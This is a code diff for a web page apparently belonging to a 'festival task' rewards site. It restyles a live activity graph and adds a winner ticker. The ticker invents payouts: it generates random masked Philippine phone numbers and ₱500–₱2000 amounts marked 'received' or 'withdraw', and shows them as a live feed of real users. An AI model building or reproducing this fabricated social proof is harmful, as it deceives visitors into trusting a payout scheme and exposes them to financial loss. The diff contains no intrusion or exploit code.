@@ -172,22 +172,44 @@
             opacity: 0;
         }
         
-        .graph-point {
-            fill: #f5c842;
-            stroke: #0a0e2a;
-            stroke-width: 2;
+        /* ✅ PT_icon Endpoint Design */
+        .graph-endpoint-icon {
             cursor: pointer;
+            filter: drop-shadow(0 0 8px rgba(57, 255, 20, 0.8));
+            animation: endpointPulse 1.5s ease-in-out infinite;
         }
         
-        .graph-point.today {
-            fill: #39ff14;
-            stroke: #0a0e2a;
-            animation: pointPulse 1.5s ease-in-out infinite;
+        @keyframes endpointPulse {
+            0%, 100% { 
+                transform: scale(1); 
+                filter: drop-shadow(0 0 8px rgba(57, 255, 20, 0.8));
+            }
+            50% { 
+                transform: scale(1.15); 
+                filter: drop-shadow(0 0 15px rgba(57, 255, 20, 1));
+            }
         }
         
-        @keyframes pointPulse {
-            0%, 100% { r: 5; filter: drop-shadow(0 0 5px #39ff14); }
-            50% { r: 7; filter: drop-shadow(0 0 15px #39ff14); }
+        .graph-endpoint-ring {
+            fill: none;
+            stroke: #39ff14;
+            stroke-width: 2;
+            opacity: 0.6;
+            animation: endpointRing 2s ease-out infinite;
+            transform-origin: center;
+        }
+        
+        @keyframes endpointRing {
+            0% { 
+                opacity: 0.8; 
+                r: 10;
+                stroke-width: 2;
+            }
+            100% { 
+                opacity: 0; 
+                r: 20;
+                stroke-width: 1;
+            }
         }
         
         .graph-hour-labels {
@@ -258,9 +280,10 @@
             100% { left: 150%; }
         }
         
-        .trend-stat-card-single .trend-stat-icon-img {
-            width: 52px;
-            height: 52px;
+        /* ✅ Festival Task Icon Container with PT_icon + Emoji */
+        .trend-stat-icon-img {
+            width: 56px;
+            height: 56px;
             border-radius: 12px;
             overflow: hidden;
             flex-shrink: 0;
@@ -276,11 +299,37 @@
             z-index: 2;
         }
         
-        .trend-stat-card-single .trend-stat-icon-img img {
+        .trend-stat-icon-img img {
             width: 100%;
             height: 100%;
             object-fit: cover;
             border-radius: 9px;
+        }
+        
+        /* ✅ Emoji Badge on Icon */
+        .trend-stat-icon-emoji {
+            position: absolute;
+            bottom: -4px;
+            right: -4px;
+            font-size: 18px;
+            background: linear-gradient(135deg, #ffeb3b, #ff9800);
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 
+                0 0 10px rgba(255, 215, 0, 0.8),
+                0 2px 0 #8b4500;
+            border: 2px solid #fff9c4;
+            animation: emojiBounce 2s ease-in-out infinite;
+            z-index: 3;
+        }
+        
+        @keyframes emojiBounce {
+            0%, 100% { transform: scale(1) rotate(-5deg); }
+            50% { transform: scale(1.15) rotate(5deg); }
         }
         
         .trend-stat-card-single .trend-stat-content {
@@ -368,9 +417,15 @@
                 gap: 12px;
             }
             
-            .trend-stat-card-single .trend-stat-icon-img {
-                width: 46px;
-                height: 46px;
+            .trend-stat-icon-img {
+                width: 48px;
+                height: 48px;
+            }
+            
+            .trend-stat-icon-emoji {
+                width: 20px;
+                height: 20px;
+                font-size: 14px;
             }
             
             .trend-stat-card-single .trend-stat-value {
@@ -429,13 +484,13 @@
         <div class="confetti-piece magenta"></div>
     </div>
 
-    <!-- ====== LIVE TICKER ====== -->
+    <!-- ====== LIVE TICKER (Updated Text) ====== -->
     <div class="live-ticker">
         <div class="ticker-dot"></div>
         <div class="ticker-content">
             <span class="ticker-text" id="winnerEntry">
                 <i class="fas fa-bolt"></i> 
-                0917***4256 completed task 
+                0917***4256 received 
                 <span class="ticker-amount">+₱500</span>
             </span>
         </div>
@@ -534,7 +589,7 @@
                             <!-- Line -->
                             <path class="graph-line" id="graphLine" d="" />
                             
-                            <!-- Data points -->
+                            <!-- Data points and endpoint -->
                             <g id="graphPoints"></g>
                         </svg>
                     </div>
@@ -553,14 +608,15 @@
                     </div>
                 </div>
                 
-                <!-- ✅ SINGLE CARD: TOTAL CLAIMS -->
+                <!-- ✅ SINGLE CARD: TOTAL CLAIMS with PT_icon + Emoji -->
                 <div class="trend-stats-row-single">
                     <div class="trend-stat-card-single">
                         <div class="trend-stat-icon-img">
-                            <img src="images/PT_icon.png" alt="Total Claims">
+                            <img src="images/PT_icon.png" alt="Festival Task">
+                            <div class="trend-stat-icon-emoji">🎯</div>
                         </div>
                         <div class="trend-stat-content">
-                            <div class="trend-stat-label">TOTAL CLAIMS</div>
+                            <div class="trend-stat-label">FESTIVAL TASK</div>
                             <div class="trend-stat-value" id="totalClaimsCount">0</div>
                             <div class="trend-stat-sub">
                                 <span class="stat-dot"></span>
@@ -670,6 +726,7 @@
     <script>
         // ============================================================
         // LIVE TREND DASHBOARD - Line Graph + Total Claims
+        // With PT_icon Endpoint + Updated Winner Ticker
         // ============================================================
         
         (function() {
@@ -679,6 +736,7 @@
             var graphUpdateInterval = null;
             var claimsRefreshInterval = null;
             var resetTimerInterval = null;
+            var tickerInterval = null;
             
             // ========== INIT ==========
             function init() {
@@ -696,10 +754,13 @@
                 // Load total claims
                 loadTotalClaims();
                 
+                // Start winner ticker
+                startWinnerTicker();
+                
                 // Update graph every 15 seconds
                 graphUpdateInterval = setInterval(drawLineGraph, 15000);
                 
-                // Refresh claims every 10 seconds (faster update)
+                // Refresh claims every 10 seconds
                 claimsRefreshInterval = setInterval(loadTotalClaims, 10000);
                 
                 // Start reset timer
@@ -708,7 +769,7 @@
                 console.log('📊 Live Trend Dashboard initialized');
             }
             
-            // ========== DRAW LINE GRAPH (Updates to RIGHT) ==========
+            // ========== DRAW LINE GRAPH WITH PT_icon ENDPOINT ==========
             function drawLineGraph() {
                 var svg = document.getElementById('lineGraphSvg');
                 var linePath = document.getElementById('graphLine');
@@ -723,18 +784,16 @@
                 var graphWidth = svgWidth - (padding * 2);
                 var graphHeight = svgHeight - (padding * 2);
                 
-                // ✅ Current hour
                 var now = new Date();
                 var currentHour = now.getHours();
                 
-                // ✅ Generate hourly data - 24 points, latest = RIGHT
+                // Generate hourly data
                 var hourlyData = [];
                 var maxValue = 1;
                 
                 for (var i = 0; i < 24; i++) {
                     var hoursAgo = 23 - i;
                     var hour = (currentHour - hoursAgo + 24) % 24;
-                    
                     var value = getHourlyActivity(hour);
                     
                     hourlyData.push({
@@ -753,6 +812,9 @@
                 var pointsHtml = '';
                 var stepX = graphWidth / (hourlyData.length - 1);
                 
+                var endpointX = 0;
+                var endpointY = 0;
+                
                 for (var j = 0; j < hourlyData.length; j++) {
                     var point = hourlyData[j];
                     var x = padding + (j * stepX);
@@ -767,11 +829,10 @@
                         areaD += ' L ' + x + ' ' + y;
                     }
                     
-                    // Only show current hour point
+                    // ✅ Save endpoint (rightmost)
                     if (point.isCurrentHour) {
-                        pointsHtml += '<circle class="graph-point today" cx="' + x + '" cy="' + y + '" r="6">';
-                        pointsHtml += '<title>NOW (' + point.label + '): ' + point.value + '</title>';
-                        pointsHtml += '</circle>';
+                        endpointX = x;
+                        endpointY = y;
                     }
                 }
                 
@@ -785,14 +846,12 @@
                 linePath.style.strokeDashoffset = '2000';
                 linePath.style.transition = 'none';
                 
-                // Trigger reflow
                 void linePath.offsetWidth;
                 
-                // Animate line draw
                 linePath.style.transition = 'stroke-dashoffset 1.5s ease-out';
                 linePath.style.strokeDashoffset = '0';
                 
-                // Area fade in
+                // Area fade
                 areaPath.style.opacity = '0';
                 areaPath.setAttribute('d', areaD);
                 areaPath.style.transition = 'none';
@@ -800,8 +859,30 @@
                 areaPath.style.transition = 'opacity 1.5s ease-out';
                 areaPath.style.opacity = '0.5';
                 
-                // Points
-                pointsGroup.innerHTML = pointsHtml;
+                // ✅ BUILD ENDPOINT WITH PT_icon.png
+                var endpointHtml = '';
+                
+                // Endpoint pulse ring
+                endpointHtml += '<circle class="graph-endpoint-ring" cx="' + endpointX + '" cy="' + endpointY + '" r="10" />';
+                
+                // ✅ Use PT_icon.png as endpoint marker
+                // We'll use a foreignObject to embed the image
+                endpointHtml += '<foreignObject x="' + (endpointX - 12) + '" y="' + (endpointY - 12) + '" width="24" height="24" class="graph-endpoint-icon">';
+                endpointHtml += '<div xmlns="http://www.w3.org/1999/xhtml" style="';
+                endpointHtml += 'width: 100%; height: 100%;';
+                endpointHtml += 'border-radius: 50%;';
+                endpointHtml += 'overflow: hidden;';
+                endpointHtml += 'border: 2px solid #39ff14;';
+                endpointHtml += 'box-shadow: 0 0 15px #39ff14, 0 0 30px rgba(57, 255, 20, 0.5);';
+                endpointHtml += 'background: #0a0e2a;';
+                endpointHtml += 'display: flex; align-items: center; justify-content: center;';
+                endpointHtml += 'animation: endpointPulse 1.5s ease-in-out infinite;';
+                endpointHtml += '">';
+                endpointHtml += '<img src="images/PT_icon.png" style="width: 100%; height: 100%; object-fit: cover;" alt="Now" />';
+                endpointHtml += '</div>';
+                endpointHtml += '</foreignObject>';
+                
+                pointsGroup.innerHTML = endpointHtml;
             }
             
             // ========== HOURLY ACTIVITY ==========
@@ -836,7 +917,7 @@
                 
                 db.ref('festival_stats/daily/' + dateKey + '/claims_count').once('value').then(function(snap) {
                     var count = snap.val() || 0;
-                    var totalAmount = count * 500;  // ✅ MULTIPLY BY 500
+                    var totalAmount = count * 500;
                     
                     animateNumber('totalClaimsCount', count);
                     
@@ -885,6 +966,64 @@
                         el.textContent = targetValue;
                     }
                 }, duration / steps);
+            }
+            
+            // ========== WINNER TICKER (Updated Text) ==========
+            function startWinnerTicker() {
+                var winnerEntry = document.getElementById('winnerEntry');
+                if (!winnerEntry) return;
+                
+                var prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955", "0939", "0906", "0977"];
+                var amounts = [500, 500, 500, 1000, 500, 500, 500, 2000, 500, 500];
+                
+                // ✅ New texts: "received" and "withdraw"
+                var actions = ["received", "received", "received", "withdraw", "received", "received"];
+                
+                function generateWinner() {
+                    var prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
+                    var last4 = Math.floor(1000 + Math.random() * 9000);
+                    var amount = amounts[Math.floor(Math.random() * amounts.length)];
+                    var action = actions[Math.floor(Math.random() * actions.length)];
+                    return { 
+                        prefix: prefix, 
+                        last4: last4, 
+                        amount: amount,
+                        action: action
+                    };
+                }
+                
+                function updateTicker() {
+                    var winner = generateWinner();
+                    var phoneNumber = winner.prefix + '***' + winner.last4;
+                    
+                    // ✅ Build text with "received" or "withdraw"
+                    var text = '<i class="fas fa-bolt"></i> ' + 
+                               phoneNumber + ' ' + 
+                               winner.action + ' ' +
+                               '<span class="ticker-amount">+₱' + winner.amount.toLocaleString() + '</span>';
+                    
+                    // Fade out
+                    winnerEntry.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
+                    winnerEntry.style.opacity = '0';
+                    winnerEntry.style.transform = 'translateY(-5px)';
+                    
+                    setTimeout(function() {
+                        winnerEntry.innerHTML = text;
+                        winnerEntry.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
+                        winnerEntry.style.opacity = '1';
+                        winnerEntry.style.transform = 'translateY(0)';
+                    }, 300);
+                }
+                
+                // Initial
+                var initialWinner = generateWinner();
+                winnerEntry.innerHTML = '<i class="fas fa-bolt"></i> ' + 
+                    initialWinner.prefix + '***' + initialWinner.last4 + ' ' +
+                    initialWinner.action + ' ' +
+                    '<span class="ticker-amount">+₱' + initialWinner.amount.toLocaleString() + '</span>';
+                
+                // Update every 4.8 seconds
+                tickerInterval = setInterval(updateTicker, 4800);
             }
             
             // ========== RESET TIMER ==========
